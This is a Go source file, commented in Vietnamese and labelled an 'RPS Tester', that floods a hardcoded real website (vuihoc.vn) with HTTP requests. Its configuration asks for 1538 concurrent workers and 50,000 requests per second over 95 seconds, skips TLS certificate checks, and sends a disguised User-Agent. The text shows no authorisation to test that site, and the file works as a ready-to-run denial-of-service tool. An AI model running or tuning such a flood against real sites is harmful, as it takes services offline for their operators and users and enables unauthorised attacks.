package main

import (
  "bytes"
  "context"
  "crypto/tls"
  "fmt"
  "io"
  "net"
  "net/http"
  "net/url"
  "runtime"
  "strings"
  "sync"
  "sync/atomic"
  "time"
)

func main() {
  runtime.GOMAXPROCS(runtime.NumCPU())

  // ==== CONFIG NHÚNG ====
  target := "https://vuihoc.vn"
  method := "GET"
  concurrency := 1538
  duration := 95 * time.Second
  rps := 50000
  http2 := true
  bodyStr := "" // nếu cần POST body thì để ở đây
  bodyFile := "" // không dùng file thì để rỗng
  timeout := 0 * time.Second
  warm := 200
  headers := []string{
    // ví dụ: "Authorization: Bearer XXX"
  }
  // ======================

  // Build request template
  u, err := url.Parse(target)
  if err != nil {
    panic(err)
  }

  var payload []byte
  if bodyFile != "" {
    // bỏ qua file reading cho đơn giản, chỉ dùng bodyStr
    payload = []byte(bodyStr)
  } else {
    payload = []byte(bodyStr)
  }
  hasBody := len(payload) > 0 && strings.ToUpper(method) != "GET" && strings.ToUpper(method) != "HEAD"

  // Transport tối ưu
  tr := &http.Transport{
    Proxy:                 http.ProxyFromEnvironment,
    DialContext:           (&net.Dialer{Timeout: 5 * time.Second, KeepAlive: 30 * time.Second}).DialContext,
    ForceAttemptHTTP2:     http2,
    MaxIdleConns:          1_000_000,
    MaxIdleConnsPerHost:   1_000_000,
    MaxConnsPerHost:       0,
    IdleConnTimeout:       90 * time.Second,
    ExpectContinueTimeout: 0,
    DisableCompression:    true,
    TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
  }
  client := &http.Client{
    Transport: tr,
    Timeout:   timeout,
  }

  // Prepare headers
  baseHeader := make(http.Header)
  for _, line := range headers {
    parts := strings.SplitN(line, ":", 2)
    if len(parts) == 2 {
      baseHeader.Add(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
    }
  }
  if baseHeader.Get("User-Agent") == "" {
    baseHeader.Set("User-Agent", "go-rapid-ultra-go-only-web-browser-by-trans-javascript-to-golang-to-run-without-so-much-ram-and-to-make-web-fast./1.0")
  }
  baseHeader.Del("Connection") // cho keep-alive

  // Warm-up
  if warm > 0 {
    var wg sync.WaitGroup
    warmReq, _ := http.NewRequest("HEAD", u.String(), nil)
    warmReq.Header = baseHeader.Clone()
    for i := 0; i < warm; i++ {
      wg.Add(1)
      go func() {
        defer wg.Done()
        resp, err := client.Do(warmReq)
        if err == nil {
          io.Copy(io.Discard, resp.Body)
          resp.Body.Close()
        }
      }()
    }
    wg.Wait()
  }

  var success, fail uint64
  var totalLatency int64

  if concurrency <= 0 {
    concurrency = 1
  }
  perWorkerRPS := float64(rps) / float64(concurrency)
  if perWorkerRPS < 1 {
    perWorkerRPS = 1
  }

  var bodyPool = sync.Pool{
    New: func() any { return bytes.NewBuffer(make([]byte, 0, len(payload))) },
  }

  ctx, cancel := context.WithTimeout(context.Background(), duration)
  defer cancel()

  worker := func() {
    interval := time.Duration(float64(time.Second) / perWorkerRPS)
    if interval <= 0 {
      interval = time.Microsecond
    }
    ticker := time.NewTicker(interval)
    defer ticker.Stop()

    for {
      select {
      case <-ctx.Done():
        return
      case <-ticker.C:
        var bodyReader io.Reader
        if hasBody {
          buf := bodyPool.Get().(*bytes.Buffer)
          buf.Reset()
          buf.Write(payload)
          bodyReader = bytes.NewReader(buf.Bytes())
          bodyPool.Put(buf)
        }
        req, _ := http.NewRequest(method, u.String(), bodyReader)
        req.Header = baseHeader.Clone()

        start := time.Now()
        resp, err := client.Do(req)
        lat := time.Since(start)

        if err != nil {
          atomic.AddUint64(&fail, 1)
          continue
        }

        if resp.Body != nil {
          io.Copy(io.Discard, resp.Body)
          resp.Body.Close()
        }

        if resp.StatusCode >= 200 && resp.StatusCode < 400 {
          atomic.AddUint64(&success, 1)
        } else {
          atomic.AddUint64(&fail, 1)
        }
        atomic.AddInt64(&totalLatency, int64(lat))
      }
    }
  }

  var wg sync.WaitGroup
  for i := 0; i < concurrency; i++ {
    wg.Add(1)
    go func() { defer wg.Done(); worker() }()
  }

  <-ctx.Done()
  wg.Wait()

  s := atomic.LoadUint64(&success)
  f := atomic.LoadUint64(&fail)
  total := s + f
  elapsed := duration.Seconds()
  rpsAchieved := float64(total) / elapsed
  var p50ms float64
  if total > 0 {
    avgLat := time.Duration(atomic.LoadInt64(&totalLatency) / int64(total))
    p50ms = float64(avgLat.Microseconds()) / 1000.0
  }

  fmt.Printf("\n=== RPS Tester Result ===\n")
  fmt.Printf("Target:        %s\n", target)
  fmt.Printf("Method:        %s  | Concurrency: %d  | Duration: %s\n", strings.ToUpper(method), concurrency, duration)
  fmt.Printf("HTTP/2:        %v\n", http2)
  fmt.Printf("Requested RPS: %d  | Achieved RPS: %.0f\n", rps, rpsAchieved)
  fmt.Printf("Success:       %d  | Fail: %d\n", s, f)
  if total > 0 {
    fmt.Printf("Avg latency:   ~%.2f ms (approx)\n", p50ms)
  }
}
